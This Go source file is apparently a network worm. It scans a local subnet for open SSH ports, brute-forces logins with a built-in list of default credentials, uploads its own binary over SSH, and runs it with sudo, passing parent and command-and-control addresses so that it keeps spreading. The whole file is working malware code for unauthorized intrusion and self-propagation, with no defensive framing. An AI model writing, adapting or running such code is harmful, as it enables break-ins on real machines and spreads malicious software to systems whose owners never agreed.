package main

import (
	"bytes"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"encoding/base64"
	"os"

	"golang.org/x/crypto/ssh"

	_ "embed"
)

type Credential struct {
	user string
	pass string
}

var WORDLIST = [10]Credential{
	{"root", "root"},
	{"admin", "admin"},
	{"user", "user"},
	{"test", "test"},
	{"guest", "guest"},
	{"pi", "raspberry"},
	{"ubuntu", "ubuntu"},
	{"root", "password"},
	{"admin", "password"},
	{"root", "123456"},
}

func scanPort(host Host, timeout time.Duration, result chan Host) {
	target := net.JoinHostPort(host.ip, host.port)
	conn, err := net.DialTimeout("tcp", target, timeout)
	if err != nil {
		return
	}
	result <- host
	fmt.Printf("Found %s:%s open\n", host.ip, host.port)
	conn.Close()
}

func scanNetwork() chan Host {
	const port = "22"
	const timeout = 2 * time.Second

	open := make(chan Host)

	var wg sync.WaitGroup
	for i := range 256 {
		ip := strings.Join(append(subnet[:], strconv.Itoa(i)), ".")
		wg.Add(1)
		go func() {
			scanPort(Host{ip, port}, timeout, open)
			wg.Done()
		}()
	}
	go func() {
		wg.Wait()
		close(open)
	}()
	return open
}

func bruteforceSSHCredentials(host Host) chan Credential {
	valids := make(chan Credential)
	var wg sync.WaitGroup

	for _, credentials := range WORDLIST {
		wg.Add(1)
		go func() {
			defer wg.Done()
			config := &ssh.ClientConfig{
				User: credentials.user,
				Auth: []ssh.AuthMethod{
					ssh.Password(credentials.pass),
				},
				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
				Timeout:         5 * time.Second,
			}
			client, err := ssh.Dial("tcp", net.JoinHostPort(host.ip, host.port), config)
			if err != nil {
				return
			}
			session, err := client.NewSession()
			if err != nil {
				client.Close()
				return
			}
			client.Close()
			session.Close()
			fmt.Printf("Found %s:%s use credential %s:%s\n", host.ip, host.port, credentials.user, credentials.pass)
			valids <- credentials
		}()
	}
	go func() {
		wg.Wait()
		close(valids)
	}()
	return valids
}

// Binary is on form base64
func contaminate(host Host, credentials Credential) error {
	// Read and encode the binary
	binaryBytes, err := os.ReadFile("/tmp/main")
	if err != nil {
		return fmt.Errorf("failed to read /tmp/main: %v", err)
	}
	binary := base64.StdEncoding.EncodeToString(binaryBytes)

	config := &ssh.ClientConfig{
		User: credentials.user,
		Auth: []ssh.AuthMethod{
			ssh.Password(credentials.pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         30 * time.Second,
	}

	address := net.JoinHostPort(host.ip, host.port)
	client, err := ssh.Dial("tcp", address, config)
	if err != nil {
		return fmt.Errorf("failed to connect to %s: %v", address, err)
	}
	defer client.Close()

	// Write base64-encoded binary to /tmp/main
	session, err := client.NewSession()
	if err != nil {
		return fmt.Errorf("failed to create session for writing binary: %v", err)
	}
	defer session.Close()

	var stdoutBuf, stderrBuf bytes.Buffer
	session.Stdout = &stdoutBuf
	session.Stderr = &stderrBuf
	session.Stdin = bytes.NewReader([]byte(binary))

	cmd := `base64 -d > /tmp/main`
	err = session.Run(cmd)
	if err != nil {
		return fmt.Errorf("failed to write binary to /tmp/main: %v, stdout: %s, stderr: %s", err, stdoutBuf.String(), stderrBuf.String())
	}

	// Execute sudo command to chmod and run the binary
	session, err = client.NewSession()
	if err != nil {
		return fmt.Errorf("failed to create session for execution: %v", err)
	}
	defer session.Close()

	stdoutBuf.Reset()
	stderrBuf.Reset()
	session.Stdout = &stdoutBuf
	session.Stderr = &stderrBuf

	cmd = fmt.Sprintf(`echo "%s" | sudo -S sh -c 'chmod +x /tmp/main; MY_IP=%s MY_PORT=%s PARENT_IP=%s PARENT_PORT=%s C2_ADDR=%s nohup /tmp/main > /tmp/log.log 2>&1'`, credentials.pass, host.ip, "8080", myHost.ip, myHost.port, c2Addr)
	fmt.Println("Executing command:", cmd)
	err = session.Run(cmd)

	fmt.Println("STDOUT:", stdoutBuf.String())
	fmt.Println("STDERR:", stderrBuf.String())

	if err != nil {
		if err == io.EOF {
			return fmt.Errorf("SSH session closed unexpectedly: %v, stderr: %s", err, stderrBuf.String())
		}
		return fmt.Errorf("failed to execute command: %v, stderr: %s", err, stderrBuf.String())
	}

	return nil
}

func spread() string {
	var counter atomic.Uint32
	var wg sync.WaitGroup
	for host := range scanNetwork() {
		fmt.Print("Found host ")
		fmt.Println(host)
		wg.Add(1)
		go func() {
			defer wg.Done()
			creds := bruteforceSSHCredentials(host)
			for cred := range creds {
				fmt.Printf("Found credentials for host %s %s:%s\n", host, cred.user, cred.pass)
				err := contaminate(host, cred)
				if err == nil {
					fmt.Println("Increase by one")
					counter.Add(1)
				} else {
					fmt.Println(err)
				}
			}
		}()
	}
	wg.Wait()
	return fmt.Sprintf("%d", counter.Load())
}
